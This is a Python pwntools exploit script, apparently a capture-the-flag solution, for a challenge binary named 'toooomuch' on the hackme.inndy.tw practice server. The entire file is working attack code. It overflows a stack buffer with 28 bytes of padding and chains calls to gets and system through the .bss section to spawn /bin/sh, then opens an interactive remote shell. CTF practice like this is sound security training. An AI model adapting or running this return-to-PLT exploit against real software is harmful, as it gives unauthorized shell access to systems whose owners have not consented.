#!/usr/bin/env python
from pwn import *
a=remote("hackme.inndy.tw",7702)
elf=ELF("./toooomuch")

gets_addr=elf.plt["gets"]
bss_addr=elf.bss()
system_addr=elf.plt["system"]
pop_ret = 0x8048455
payload='A'*28
payload+=p32(gets_addr)
payload+=p32(pop_ret)
payload+=p32(bss_addr)
payload+=p32(system_addr)
payload+=p32(pop_ret)
payload+=p32(bss_addr)

a.recvuntil("Give me your passcode: ")
a.sendline(payload)
a.recvuntil("\n")
a.sendline("/bin/sh")
a.interactive()
